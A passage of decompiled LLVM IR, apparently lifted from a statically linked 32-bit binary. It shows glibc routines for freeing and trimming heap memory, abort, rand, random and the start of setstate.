  %v1_8053105 = and i32 %v3_8053100, -4
  %v4_8053105 = trunc i32 %v1_8053105 to i8
  store i32 %v1_8053105, i32* @ebx, align 4
  %v8_805310a = icmp ugt i8 %v4_8053105, %v0_80530f8
  br i1 %v8_805310a, label %dec_label_pc_805312c, label %dec_label_pc_805310c

dec_label_pc_805310c:                             ; preds = %dec_label_pc_80530d4
  %v2_805310c = udiv i32 %v3_8053100, 8
  store i32 %v2_805310c, i32* @ebx, align 4
  %v1_805310f = or i32 %v1_80530f8, 3
  %v3_805310f = trunc i32 %v1_805310f to i8
  store i32 %v1_805310f, i32* %eax.global-to-local, align 4
  store i8 %v3_805310f, i8* @global_var_8067680.236, align 128
  %v1_8053117 = mul nuw i32 %v2_805310c, 4
  %v2_8053117 = add i32 %v1_8053117, ptrtoint (i8* @global_var_8067680.236 to i32)
  store i32 %v2_8053117, i32* %edx.global-to-local, align 4
  %v1_805311e = add i32 %v1_8053117, add (i32 ptrtoint (i8* @global_var_8067680.236 to i32), i32 -4)
  %v2_805311e = inttoptr i32 %v1_805311e to i32*
  %v3_805311e = load i32, i32* %v2_805311e, align 4
  store i32 %v3_805311e, i32* %eax.global-to-local, align 4
  %v3_8053121 = inttoptr i32 %arg1 to i32*
  store i32 %v3_805311e, i32* %v3_8053121, align 4
  %v0_8053124 = load i32, i32* @ecx, align 4
  %v1_8053124 = load i32, i32* %edx.global-to-local, align 4
  %v2_8053124 = add i32 %v1_8053124, -4
  %v3_8053124 = inttoptr i32 %v2_8053124 to i32*
  store i32 %v0_8053124, i32* %v3_8053124, align 4
  br label %dec_label_pc_8053244

dec_label_pc_805312c:                             ; preds = %dec_label_pc_80530d4
  %v1_805312c = trunc i32 %v3_8053100 to i8
  %v2_805312c = and i8 %v1_805312c, 2
  %v3_805312c = icmp eq i8 %v2_805312c, 0
  %v5_805312c = zext i8 %v2_805312c to i32
  %v7_805312c = and i32 %v3_8053100, -256
  %v8_805312c = or i32 %v5_805312c, %v7_805312c
  store i32 %v8_805312c, i32* %edx.global-to-local, align 4
  %v1_805312f = icmp eq i1 %v3_805312c, false
  br i1 %v1_805312f, label %dec_label_pc_8053224, label %dec_label_pc_8053135

dec_label_pc_8053135:                             ; preds = %dec_label_pc_805312c
  %v1_8053135 = or i32 %v1_80530f8, 1
  %v3_8053135 = trunc i32 %v1_8053135 to i8
  store i32 %v1_8053135, i32* %eax.global-to-local, align 4
  %v2_8053138 = add i32 %v1_8053105, %v1_80530f5
  store i32 %v2_8053138, i32* @esi, align 4
  store i8 %v3_8053135, i8* @global_var_8067680.236, align 128
  %v1_8053140 = add i32 %v2_8053138, 4
  %v2_8053140 = inttoptr i32 %v1_8053140 to i32*
  %v3_8053140 = load i32, i32* %v2_8053140, align 4
  store i32 %v3_8053140, i32* %eax.global-to-local, align 4
  %v2_8053147 = inttoptr i32 %v1_8053100 to i8*
  %v3_8053147 = load i8, i8* %v2_8053147, align 1
  %v4_8053147 = urem i8 %v3_8053147, 2
  %v5_8053147 = icmp eq i8 %v4_8053147, 0
  %v1_805314b = icmp eq i1 %v5_8053147, false
  br i1 %v1_805314b, label %dec_label_pc_805316e, label %dec_label_pc_805314d

dec_label_pc_805314d:                             ; preds = %dec_label_pc_8053135
  %v2_805314d = inttoptr i32 %v1_80530f5 to i32*
  %v3_805314d = load i32, i32* %v2_805314d, align 4
  store i32 %v3_805314d, i32* @ebp, align 4
  %v2_8053152 = sub i32 %v1_80530f5, %v3_805314d
  store i32 %v2_8053152, i32* %eax.global-to-local, align 4
  %v1_8053154 = add i32 %v2_8053152, 8
  %v2_8053154 = inttoptr i32 %v1_8053154 to i32*
  %v3_8053154 = load i32, i32* %v2_8053154, align 4
  store i32 %v3_8053154, i32* @edi, align 4
  %v1_8053157 = add i32 %v2_8053152, 12
  %v2_8053157 = inttoptr i32 %v1_8053157 to i32*
  %v3_8053157 = load i32, i32* %v2_8053157, align 4
  store i32 %v3_8053157, i32* %edx.global-to-local, align 4
  %v1_805315a = add i32 %v3_8053154, 12
  %v2_805315a = inttoptr i32 %v1_805315a to i32*
  %v3_805315a = load i32, i32* %v2_805315a, align 4
  store i32 %v3_805315a, i32* @ecx, align 4
  %v12_805315d = icmp eq i32 %v3_805315a, %v2_8053152
  %v1_805315f = icmp eq i1 %v12_805315d, false
  br i1 %v1_805315f, label %dec_label_pc_805319d, label %dec_label_pc_8053161

dec_label_pc_8053161:                             ; preds = %dec_label_pc_805314d
  %v1_8053161 = add i32 %v3_8053157, 8
  %v2_8053161 = inttoptr i32 %v1_8053161 to i32*
  %v3_8053161 = load i32, i32* %v2_8053161, align 4
  %v15_8053161 = icmp eq i32 %v3_8053161, %v3_805315a
  %v1_8053164 = icmp eq i1 %v15_8053161, false
  br i1 %v1_8053164, label %dec_label_pc_805319d, label %dec_label_pc_8053166

dec_label_pc_8053166:                             ; preds = %dec_label_pc_8053161
  %v2_8053166 = add i32 %v3_805314d, %v1_8053105
  store i32 %v2_8053166, i32* @ebx, align 4
  store i32 %v3_8053157, i32* %v2_805315a, align 4
  %v0_805316b = load i32, i32* @edi, align 4
  %v1_805316b = load i32, i32* %edx.global-to-local, align 4
  %v2_805316b = add i32 %v1_805316b, 8
  %v3_805316b = inttoptr i32 %v2_805316b to i32*
  store i32 %v0_805316b, i32* %v3_805316b, align 4
  %v0_8053175.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805316e

dec_label_pc_805316e:                             ; preds = %dec_label_pc_8053135, %dec_label_pc_8053166
  %v1_8053181 = phi i32 [ %v2_8053138, %dec_label_pc_8053135 ], [ %v0_8053175.pre, %dec_label_pc_8053166 ]
  %v1_8053172 = and i32 %v3_8053140, -4
  store i32 %v1_8053172, i32* @ebp, align 4
  %v1_8053175 = load i32, i32* @global_var_80676ac.237, align 4
  %v12_8053175 = icmp eq i32 %v1_8053181, %v1_8053175
  br i1 %v12_8053175, label %dec_label_pc_80531cf, label %dec_label_pc_805317d

dec_label_pc_805317d:                             ; preds = %dec_label_pc_805316e
  %v2_805317d = add i32 %v1_8053181, 4
  %v3_805317d = add i32 %v2_805317d, %v1_8053172
  %v4_805317d = inttoptr i32 %v3_805317d to i32*
  %v5_805317d = load i32, i32* %v4_805317d, align 4
  store i32 %v5_805317d, i32* %eax.global-to-local, align 4
  %v3_8053181 = inttoptr i32 %v2_805317d to i32*
  store i32 %v1_8053172, i32* %v3_8053181, align 4
  %v0_8053184 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053184 = urem i32 %v0_8053184, 2
  %v2_8053184 = icmp eq i32 %v1_8053184, 0
  store i32 %v1_8053184, i32* %eax.global-to-local, align 4
  %v1_8053189 = icmp eq i1 %v2_8053184, false
  br i1 %v1_8053189, label %dec_label_pc_80531aa, label %dec_label_pc_805318b

dec_label_pc_805318b:                             ; preds = %dec_label_pc_805317d
  %v0_805318b = load i32, i32* @esi, align 4
  %v1_805318b = add i32 %v0_805318b, 8
  %v2_805318b = inttoptr i32 %v1_805318b to i32*
  %v3_805318b = load i32, i32* %v2_805318b, align 4
  store i32 %v3_805318b, i32* @edx, align 4
  %v1_805318e = add i32 %v0_805318b, 12
  %v2_805318e = inttoptr i32 %v1_805318e to i32*
  %v3_805318e = load i32, i32* %v2_805318e, align 4
  store i32 %v3_805318e, i32* %eax.global-to-local, align 4
  %v1_8053191 = add i32 %v3_805318b, 12
  %v2_8053191 = inttoptr i32 %v1_8053191 to i32*
  %v3_8053191 = load i32, i32* %v2_8053191, align 4
  store i32 %v3_8053191, i32* @edi, align 4
  %v12_8053194 = icmp eq i32 %v3_8053191, %v0_805318b
  %v1_8053196 = icmp eq i1 %v12_8053194, false
  br i1 %v1_8053196, label %dec_label_pc_805319d, label %dec_label_pc_8053198

dec_label_pc_8053198:                             ; preds = %dec_label_pc_805318b
  %v1_8053198 = add i32 %v3_805318e, 8
  %v2_8053198 = inttoptr i32 %v1_8053198 to i32*
  %v3_8053198 = load i32, i32* %v2_8053198, align 4
  %v15_8053198 = icmp eq i32 %v3_8053198, %v3_8053191
  br i1 %v15_8053198, label %dec_label_pc_80531a2, label %dec_label_pc_805319d

dec_label_pc_805319d:                             ; preds = %dec_label_pc_8053198, %dec_label_pc_805318b, %dec_label_pc_8053161, %dec_label_pc_805314d
  %v0_805319d = call i32 @abort()
  store i32 %v0_805319d, i32* %eax.global-to-local, align 4
  %v1_80531a2.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80531a2

dec_label_pc_80531a2:                             ; preds = %dec_label_pc_8053198, %dec_label_pc_805319d
  %v1_80531a2 = phi i32 [ %v3_805318b, %dec_label_pc_8053198 ], [ %v1_80531a2.pre, %dec_label_pc_805319d ]
  %v0_80531a2 = phi i32 [ %v3_805318e, %dec_label_pc_8053198 ], [ %v0_805319d, %dec_label_pc_805319d ]
  %v2_80531a2 = add i32 %v1_80531a2, 12
  %v3_80531a2 = inttoptr i32 %v2_80531a2 to i32*
  store i32 %v0_80531a2, i32* %v3_80531a2, align 4
  %v0_80531a5 = load i32, i32* @edx, align 4
  %v1_80531a5 = load i32, i32* %eax.global-to-local, align 4
  %v2_80531a5 = add i32 %v1_80531a5, 8
  %v3_80531a5 = inttoptr i32 %v2_80531a5 to i32*
  store i32 %v0_80531a5, i32* %v3_80531a5, align 4
  %v0_80531a8 = load i32, i32* @ebx, align 4
  %v1_80531a8 = load i32, i32* @ebp, align 4
  %v2_80531a8 = add i32 %v1_80531a8, %v0_80531a8
  store i32 %v2_80531a8, i32* @ebx, align 4
  br label %dec_label_pc_80531aa

dec_label_pc_80531aa:                             ; preds = %dec_label_pc_805317d, %dec_label_pc_80531a2
  %v0_80531aa = load i32, i32* @global_var_80676bc.255, align 4
  store i32 %v0_80531aa, i32* %eax.global-to-local, align 4
  %v0_80531af = load i32, i32* @ecx, align 4
  %v1_80531af = add i32 %v0_80531af, 12
  %v2_80531af = inttoptr i32 %v1_80531af to i32*
  store i32 ptrtoint (i32* @global_var_80676b4.239 to i32), i32* %v2_80531af, align 4
  %v0_80531b6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80531b6 = load i32, i32* @ecx, align 4
  %v2_80531b6 = add i32 %v1_80531b6, 8
  %v3_80531b6 = inttoptr i32 %v2_80531b6 to i32*
  store i32 %v0_80531b6, i32* %v3_80531b6, align 4
  %v0_80531b9 = load i32, i32* @ebx, align 4
  %v1_80531b9 = load i32, i32* @ecx, align 4
  %v3_80531b9 = add i32 %v1_80531b9, %v0_80531b9
  %v4_80531b9 = inttoptr i32 %v3_80531b9 to i32*
  store i32 %v0_80531b9, i32* %v4_80531b9, align 4
  %v0_80531bc = load i32, i32* @ecx, align 4
  %v1_80531bc = load i32, i32* %eax.global-to-local, align 4
  %v2_80531bc = add i32 %v1_80531bc, 12
  %v3_80531bc = inttoptr i32 %v2_80531bc to i32*
  store i32 %v0_80531bc, i32* %v3_80531bc, align 4
  %v0_80531bf = load i32, i32* @ebx, align 4
  %v1_80531c1 = or i32 %v0_80531bf, 1
  store i32 %v1_80531c1, i32* %eax.global-to-local, align 4
  %v0_80531c4 = load i32, i32* @ecx, align 4
  store i32 %v0_80531c4, i32* @global_var_80676bc.255, align 4
  %v2_80531ca = add i32 %v0_80531c4, 4
  %v3_80531ca = inttoptr i32 %v2_80531ca to i32*
  store i32 %v1_80531c1, i32* %v3_80531ca, align 4
  br label %dec_label_pc_80531df

dec_label_pc_80531cf:                             ; preds = %dec_label_pc_805316e
  %v0_80531cf = load i32, i32* @ebx, align 4
  %v2_80531cf = add i32 %v0_80531cf, %v1_8053172
  store i32 %v2_80531cf, i32* @ebx, align 4
  %v1_80531d3 = or i32 %v2_80531cf, 1
  store i32 %v1_80531d3, i32* %eax.global-to-local, align 4
  %v1_80531d6 = load i32, i32* @ecx, align 4
  %v2_80531d6 = add i32 %v1_80531d6, 4
  %v3_80531d6 = inttoptr i32 %v2_80531d6 to i32*
  store i32 %v1_80531d3, i32* %v3_80531d6, align 4
  %v0_80531d9 = load i32, i32* @ecx, align 4
  store i32 %v0_80531d9, i32* @global_var_80676ac.237, align 4
  br label %dec_label_pc_80531df

dec_label_pc_80531df:                             ; preds = %dec_label_pc_80531aa, %dec_label_pc_80531cf
  %v0_80531df = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_80531df, 131072
  br i1 %tmp21, label %dec_label_pc_8053244, label %dec_label_pc_80531e7

dec_label_pc_80531e7:                             ; preds = %dec_label_pc_80531df
  %v0_80531e7 = load i8, i8* @global_var_8067680.236, align 128
  %v1_80531e7 = and i8 %v0_80531e7, 2
  %v2_80531e7 = icmp eq i8 %v1_80531e7, 0
  br i1 %v2_80531e7, label %dec_label_pc_8053200, label %dec_label_pc_80531f0

dec_label_pc_80531f0:                             ; preds = %dec_label_pc_80531e7
  %v2_80531f8 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8067680.236 to i32*))
  store i32 %v2_80531f8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053200

dec_label_pc_8053200:                             ; preds = %dec_label_pc_80531e7, %dec_label_pc_80531f0
  %v0_8053200 = load i32, i32* @global_var_80676ac.237, align 4
  store i32 %v0_8053200, i32* %eax.global-to-local, align 4
  %v1_8053205 = add i32 %v0_8053200, 4
  %v2_8053205 = inttoptr i32 %v1_8053205 to i32*
  %v3_8053205 = load i32, i32* %v2_8053205, align 4
  %v1_8053208 = and i32 %v3_8053205, -4
  store i32 %v1_8053208, i32* %eax.global-to-local, align 4
  %v1_805320b = load i32, i32* @global_var_80679c4.253, align 4
  %v7_805320b = icmp ult i32 %v1_8053208, %v1_805320b
  br i1 %v7_805320b, label %dec_label_pc_8053244, label %dec_label_pc_8053213

dec_label_pc_8053213:                             ; preds = %dec_label_pc_8053200
  store i32 ptrtoint (i8* @global_var_8067680.236 to i32), i32* @edx, align 4
  %v0_8053218 = load i32, i32* @global_var_80679c8.251, align 8
  store i32 %v0_8053218, i32* @eax, align 4
  %v0_805321d = call i32 @__malloc_trim()
  store i32 %v0_805321d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053244

dec_label_pc_8053224:                             ; preds = %dec_label_pc_805312c
  %v2_8053224 = inttoptr i32 %v1_80530f5 to i32*
  %v3_8053224 = load i32, i32* %v2_8053224, align 4
  store i32 %v3_8053224, i32* %edx.global-to-local, align 4
  %v0_8053227 = load i32, i32* @global_var_80679d0.244, align 16
  %v1_8053227 = add i32 %v0_8053227, -1
  store i32 %v1_8053227, i32* @global_var_80679d0.244, align 16
  %v2_805322d = add i32 %v3_8053224, %v1_8053105
  store i32 %v2_805322d, i32* %eax.global-to-local, align 4
  %v2_8053230 = sub i32 %v1_80530f5, %v3_8053224
  %v0_8053236 = load i32, i32* @global_var_80679e4.247, align 4
  %v2_8053236 = sub i32 %v0_8053236, %v2_805322d
  store i32 %v2_8053236, i32* @global_var_80679e4.247, align 4
  %v4_805323c = call i32 @munmap(i32 %v2_8053230, i32 %v2_805322d, i32 %v1_8053105, i32 %v1_8053105)
  store i32 %v4_805323c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053244

dec_label_pc_8053244:                             ; preds = %dec_label_pc_8053200, %dec_label_pc_80531df, %dec_label_pc_8053213, %dec_label_pc_805310c, %dec_label_pc_8053224
  store i32 %v2_80530df, i32* %eax.global-to-local, align 4
  %v3_805324d = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v3_805324d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053255

dec_label_pc_8053255:                             ; preds = %entry, %dec_label_pc_8053244
  %.0 = phi i32 [ undef, %entry ], [ %v3_805324d, %dec_label_pc_8053244 ]
  store i32 %v0_80530c4, i32* @ebx, align 4
  store i32 %v0_80530c3, i32* @esi, align 4
  store i32 %v0_80530c2, i32* @edi, align 4
  store i32 %v0_80530c1, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_8053224, { 1, 0, 2 }
  uselistorder i32 %v0_80531b9, { 1, 0 }
  uselistorder i32 %v1_8053184, { 1, 0 }
  uselistorder i32 %v2_805317d, { 1, 0 }
  uselistorder i32 %v1_8053172, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8053181, { 1, 0 }
  uselistorder i32 %v2_805310c, { 1, 0 }
  uselistorder i32 %v1_8053105, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_8053100, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_80530f5, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 4, 5, 7, 8, 9, 10, 11, 12, 15, 16, 13, 14, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32 (i32, i32, i32, i32)* @munmap, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32* bitcast (i8* @global_var_8067680.236 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_80676b4.239 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8053255, { 1, 0 }
  uselistorder label %dec_label_pc_8053244, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8053200, { 1, 0 }
  uselistorder label %dec_label_pc_80531df, { 1, 0 }
  uselistorder label %dec_label_pc_80531aa, { 1, 0 }
  uselistorder label %dec_label_pc_80531a2, { 1, 0 }
  uselistorder label %dec_label_pc_805316e, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805325d = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_805326a = call i32 @__malloc_consolidate(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_8067680.236 to i8) to i32) to i32*))
  %v0_805326f = load i32, i32* @ebx, align 4
  store i32 %v0_805326f, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_8067680.236 to i32), i32* @edx, align 4
  store i32 %v0_805325d, i32* @ebx, align 4
  %v0_805327a = call i32 @__malloc_trim()
  ret i32 %v0_805327a

; uselistorder directives
  uselistorder i32 ()* @__malloc_trim, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_8067680.236 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i32 (i32*)* @__malloc_consolidate, { 0, 4, 1, 2, 3 }
  uselistorder i8* @global_var_8067680.236, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_805328c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062928.256 to i32))
  %v12_8053296 = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805329b

dec_label_pc_805329b:                             ; preds = %dec_label_pc_805329b.dec_label_pc_805329b_crit_edge, %entry
  %v0_805329b = phi i32 [ %v12_8053296, %entry ], [ %v0_805329b.pre, %dec_label_pc_805329b.dec_label_pc_805329b_crit_edge ]
  %v1_80532a619 = phi i32 [ 31, %entry ], [ %v1_80532a6, %dec_label_pc_805329b.dec_label_pc_805329b_crit_edge ]
  %v2_805329b = mul i32 %v1_80532a619, 4
  %v3_805329b = add i32 %v2_805329b, 152
  %v4_805329b = add i32 %v3_805329b, %v0_805329b
  %v5_805329b = inttoptr i32 %v4_805329b to i32*
  store i32 0, i32* %v5_805329b, align 4
  %v0_80532a6.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_80532a6 = add i32 %v0_80532a6.pre, -1
  %v9_80532a6 = icmp slt i32 %v1_80532a6, 0
  store i32 %v1_80532a6, i32* %eax.global-to-local, align 4
  %v1_80532a7 = icmp eq i1 %v9_80532a6, false
  br i1 %v1_80532a7, label %dec_label_pc_805329b.dec_label_pc_805329b_crit_edge, label %dec_label_pc_80532a9

dec_label_pc_805329b.dec_label_pc_805329b_crit_edge: ; preds = %dec_label_pc_805329b
  %v0_805329b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805329b

dec_label_pc_80532a9:                             ; preds = %dec_label_pc_805329b
  %v0_80532a9 = load i32, i32* @ebx, align 4
  %v2_80532ad = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_80532ad, i32* @ebx, align 4
  %v4_80532b5 = call i32 @__sigaddset(i32 %v2_80532ad, i32 6, i32 %v0_80532a9, i32 %v0_80532a9)
  store i32 %v4_80532b5, i32* %eax.global-to-local, align 4
  %v1_80532bd = icmp eq i32 %v4_80532b5, 0
  %v1_80532bf = icmp eq i1 %v1_80532bd, false
  br i1 %v1_80532bf, label %dec_label_pc_80532cf, label %dec_label_pc_80532c1

dec_label_pc_80532c1:                             ; preds = %dec_label_pc_80532a9
  %v3_80532c7 = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_80532c7 = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_80532c7, i32 0)
  store i32 %v4_80532c7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80532cf

dec_label_pc_80532cf:                             ; preds = %dec_label_pc_80532a9, %dec_label_pc_80532c1
  %v2_80533074 = phi i32 [ %v4_80532b5, %dec_label_pc_80532a9 ], [ %v4_80532c7, %dec_label_pc_80532c1 ]
  %v0_80532cf = load i8, i8* @global_var_80672a0.257, align 32
  %v1_80532cf = icmp eq i8 %v0_80532cf, 0
  %v1_80532d6 = icmp eq i1 %v1_80532cf, false
  br i1 %v1_80532d6, label %dec_label_pc_8053307, label %dec_label_pc_80532d8

dec_label_pc_80532d8:                             ; preds = %dec_label_pc_80532cf
  store i8 1, i8* @global_var_80672a0.257, align 32
  br label %dec_label_pc_80532df

dec_label_pc_80532df:                             ; preds = %dec_label_pc_8053346, %dec_label_pc_80532d8
  %v1_80532e7 = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8062928.256 to i32))
  store i32 %v1_80532e7, i32* %eax.global-to-local, align 4
  %v1_80532f3 = call i32 @__GI_raise(i32 6)
  store i32 %v1_80532f3, i32* %eax.global-to-local, align 4
  %v1_80532ff = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062928.256 to i32))
  store i32 %v1_80532ff, i32* %eax.global-to-local, align 4
  %v0_8053307.pre = load i8, i8* @global_var_80672a0.257, align 32
  br label %dec_label_pc_8053307

dec_label_pc_8053307:                             ; preds = %dec_label_pc_80532cf, %dec_label_pc_80532df
  %v2_8053307 = phi i32 [ %v2_80533074, %dec_label_pc_80532cf ], [ %v1_80532ff, %dec_label_pc_80532df ]
  %v0_8053307 = phi i8 [ %v0_80532cf, %dec_label_pc_80532cf ], [ %v0_8053307.pre, %dec_label_pc_80532df ]
  %v1_8053307 = zext i8 %v0_8053307 to i32
  %v3_8053307 = and i32 %v2_8053307, -256
  %v4_8053307 = or i32 %v1_8053307, %v3_8053307
  store i32 %v4_8053307, i32* %eax.global-to-local, align 4
  %v10_805330c = icmp eq i8 %v0_8053307, 1
  %v1_805330e = icmp eq i1 %v10_805330c, false
  br i1 %v1_805330e, label %dec_label_pc_8053368, label %dec_label_pc_8053310

dec_label_pc_8053310:                             ; preds = %dec_label_pc_8053307
  store i8 2, i8* @global_var_80672a0.257, align 32
  %v2_805331f = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_805331f, i32* %eax.global-to-local, align 4
  %v3_8053324 = bitcast i32* %stack_var_-272 to i8*
  %v4_8053324 = call i32 @__GI_memset(i8* %v3_8053324, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805333b

dec_label_pc_805333b:                             ; preds = %dec_label_pc_805333b.dec_label_pc_805333b_crit_edge, %dec_label_pc_8053310
  %v0_805333b = phi i32 [ %v12_8053296, %dec_label_pc_8053310 ], [ %v0_805333b.pre, %dec_label_pc_805333b.dec_label_pc_805333b_crit_edge ]
  %v1_805334318 = phi i32 [ 31, %dec_label_pc_8053310 ], [ %v1_8053343, %dec_label_pc_805333b.dec_label_pc_805333b_crit_edge ]
  %v2_805333b = mul i32 %v1_805334318, 4
  %v3_805333b = add i32 %v2_805333b, 16
  %v4_805333b = add i32 %v3_805333b, %v0_805333b
  %v5_805333b = inttoptr i32 %v4_805333b to i32*
  store i32 -1, i32* %v5_805333b, align 4
  %v0_8053343.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8053343 = add i32 %v0_8053343.pre, -1
  %v9_8053343 = icmp slt i32 %v1_8053343, 0
  store i32 %v1_8053343, i32* %eax.global-to-local, align 4
  %v1_8053344 = icmp eq i1 %v9_8053343, false
  br i1 %v1_8053344, label %dec_label_pc_805333b.dec_label_pc_805333b_crit_edge, label %dec_label_pc_8053346

dec_label_pc_805333b.dec_label_pc_805333b_crit_edge: ; preds = %dec_label_pc_805333b
  %v0_805333b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805333b

dec_label_pc_8053346:                             ; preds = %dec_label_pc_805333b
  store i32 %v2_805331f, i32* %eax.global-to-local, align 4
  %v4_805335b = call i32 @__GI_sigaction(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_805335b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80532df

dec_label_pc_8053368:                             ; preds = %dec_label_pc_8053307
  %v10_8053368 = icmp eq i8 %v0_8053307, 2
  %v1_805336a = icmp eq i1 %v10_8053368, false
  br i1 %v1_805336a, label %dec_label_pc_8053374, label %dec_label_pc_805336c

dec_label_pc_805336c:                             ; preds = %dec_label_pc_8053368
  store i8 3, i8* @global_var_80672a0.257, align 32
  br label %dec_label_pc_8053374

dec_label_pc_8053374:                             ; preds = %dec_label_pc_8053368, %dec_label_pc_805336c
  %v0_8053374 = phi i8 [ %v0_8053307, %dec_label_pc_8053368 ], [ 3, %dec_label_pc_805336c ]
  %v9_8053374 = icmp eq i8 %v0_8053374, 3
  %v1_805337b = icmp eq i1 %v9_8053374, false
  br i1 %v1_805337b, label %dec_label_pc_805338e, label %dec_label_pc_805337d

dec_label_pc_805337d:                             ; preds = %dec_label_pc_8053374
  store i8 4, i8* @global_var_80672a0.257, align 32
  %v1_8053389 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_805338e:                             ; preds = %dec_label_pc_8053374, %dec_label_pc_805338e
  br label %dec_label_pc_805338e

; uselistorder directives
  uselistorder i32 %v1_8053343, { 2, 1, 0 }
  uselistorder i8 %v0_8053307, { 2, 0, 1, 3 }
  uselistorder i32 %v1_80532a6, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 5, 4, 1, 6, 7, 8, 9, 10, 11, 12, 14, 13, 0 }
  uselistorder i32 140, { 0, 2, 1 }
  uselistorder i32 (i32)* @pthread_mutex_unlock, { 0, 12, 11, 10, 9, 13, 1, 3, 6, 2, 8, 7, 5, 4 }
  uselistorder i8* @global_var_80672a0.257, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_805338e, { 1, 0 }
  uselistorder label %dec_label_pc_8053374, { 1, 0 }
  uselistorder label %dec_label_pc_8053307, { 1, 0 }
  uselistorder label %dec_label_pc_80532cf, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_8053394 = call i32 @random()
  ret i32 %v0_8053394

; uselistorder directives
  uselistorder i32 ()* @random, { 22, 11, 10, 9, 8, 16, 15, 14, 13, 12, 21, 20, 19, 18, 17, 4, 3, 2, 1, 0, 7, 6, 5 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805339c = load i32, i32* @ebx, align 4
  store i32 %v0_805339c, i32* %stack_var_-4, align 4
  %v2_80533aa = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80533aa, i32* @ebx, align 4
  %v4_80533af = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134540701, i32 ptrtoint (i32* @global_var_8062940.258 to i32))
  %v1_80533bb = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062940.258 to i32))
  store i32 ptrtoint (i32* @global_var_8062940.258 to i32), i32* @ecx, align 4
  %v2_80533c2 = ptrtoint i32* %stack_var_-8 to i32
  %v3_80533cc = call i32 @__GI_random_r(i32* nonnull @global_var_8062958, i32 %v2_80533c2)
  %v3_80533d6 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  %v3_80533db = load i32, i32* %stack_var_-8, align 4
  %v2_80533e2 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80533e2, i32* @ebx, align 4
  ret i32 %v3_80533db
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v4_80533fa = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134540701, i32 ptrtoint (i32* @global_var_8062940.258 to i32))
  %v1_8053406 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062940.258 to i32))
  %v0_8053412 = load i32, i32* bitcast (i32** @global_var_8062960.261 to i32*), align 32
  store i32 %v0_8053412, i32* @ebx, align 4
  %v3_805341c = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_8062958)
  %v2_8053424 = icmp slt i32 %v3_805341c, 0
